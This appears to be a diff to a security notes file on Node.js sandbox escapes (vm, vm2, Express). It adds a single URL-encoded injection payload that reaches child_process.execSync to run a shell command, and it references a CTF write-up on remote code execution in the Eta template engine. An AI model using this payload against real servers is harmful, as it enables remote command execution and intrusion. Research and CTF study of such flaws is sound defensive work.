@@ -7,7 +7,12 @@
 -  Express
 -  Vm
 -  Vm2
-    
+
+## payload
+
+- ";process.mainModule.require(%27child_process%27).execSync(%27whoami%27)//
+
+  
 ## Reference
 https://rayhan0x01.github.io/ctf/2023/04/01/finding-rce-in-eta-cve-2022-25967.html
 
